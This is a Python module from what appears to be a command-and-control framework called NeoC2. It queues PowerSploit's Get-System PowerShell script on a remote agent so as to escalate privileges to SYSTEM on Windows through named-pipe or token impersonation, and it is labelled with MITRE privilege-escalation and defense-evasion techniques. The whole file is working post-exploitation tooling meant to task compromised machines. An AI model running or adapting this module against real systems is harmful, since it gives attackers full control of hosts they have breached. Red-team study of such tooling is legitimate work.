# modules/getsystem.py
import os
import importlib.util
import base64
import re


def get_info():
    """Get module information"""
    return {
        "name": "getsystem",
        "description": "Execute a PowerShell command to elevate privileges using Get-System technique",
        "type": "privesc",
        "platform": "windows",
        "author": "NeoC2 Framework",
        "references": ["https://github.com/PowerShellMafia/PowerSploit"],
        "technique_id": "T1134.001,T1059.001",  # Access Token Manipulation: Token Impersonation/Elevation, Command and Scripting Interpreter: PowerShell
        "mitre_tactics": ["Privilege Escalation", "Defense Evasion"],
        "options": {
            "agent_id": {
                "description": "ID of the agent to run the privilege escalation on",
                "required": True
            },
            "technique": {
                "description": "The technique to use: 'NamedPipe' or 'Token' (default: NamedPipe)",
                "required": False,
                "default": "NamedPipe"
            },
            "service_name": {
                "description": "The name of the service used with named pipe impersonation (default: TestSVC)",
                "required": False,
                "default": "TestSVC"
            },
            "pipe_name": {
                "description": "The name of the named pipe used with named pipe impersonation (default: TestSVC)",
                "required": False,
                "default": "TestSVC"
            },

        }
    }


def execute(options, session):
    """Execute the getsystem module with given options and session"""
    agent_id = options.get("agent_id")
    technique = options.get("technique", "NamedPipe")
    service_name = options.get("service_name", "TestSVC")
    pipe_name = options.get("pipe_name", "TestSVC")
    
    if not agent_id:
        return {
            "success": False,
            "error": "agent_id is required"
        }
    
    if technique not in ["NamedPipe", "Token"]:
        return {
            "success": False,
            "error": f"Invalid technique: {technique}. Must be 'NamedPipe' or 'Token'"
        }
    
    # Validate service_name and pipe_name for potential command injection
    # Only allow alphanumeric characters and common service name characters
    if not re.match(r'^[a-zA-Z0-9_.-]+$', service_name):
        return {
            "success": False,
            "error": f"Invalid service_name: {service_name}. Contains invalid characters."
        }
    
    if not re.match(r'^[a-zA-Z0-9_.-]+$', pipe_name):
        return {
            "success": False,
            "error": f"Invalid pipe_name: {pipe_name}. Contains invalid characters."
        }
    
    # Set the current agent in the session
    session.current_agent = agent_id
    

    
    # Read the original Get-System.ps1 script
    script_path = os.path.join(os.path.dirname(__file__), 'external', 'Get-System.ps1')
    try:
        with open(script_path, 'r', encoding='utf-8') as f:
            original_script = f.read()
    except FileNotFoundError:
        return {
            "success": False,
            "error": f"Could not find getsystem script at {script_path}"
        }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error reading getsystem script: {str(e)}"
        }
    
    # Build the execution command with parameters based on the technique
    if technique == "NamedPipe":
        execution_command = f'{original_script}\nGet-System -Technique {technique} -ServiceName "{service_name}" -PipeName "{pipe_name}"'
    else:
        execution_command = f'{original_script}\nGet-System -Technique {technique}'
    
    # Return the execution command - the agent will handle PowerShell execution and base64 encoding
    powershell_command = execution_command
    
    # Check if session has a valid agent_manager
    if not hasattr(session, 'agent_manager') or session.agent_manager is None:
        return {
            "success": False,
            "error": "Session does not have an initialized agent_manager"
        }
    
    # Queue the task on the agent
    try:
        agent_manager = session.agent_manager
        task_id = agent_manager.add_task(agent_id, powershell_command)
        if task_id:
            return {
                "success": True,
                "output": f"Get-System task {task_id} queued for agent {agent_id}",
                "task_id": task_id,
                "technique": technique,
                "service_name": service_name,
                "pipe_name": pipe_name
            }
        else:
            return {
                "success": False,
                "error": f"Failed to queue task for agent {agent_id}"
            }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error queuing task: {str(e)}"
        }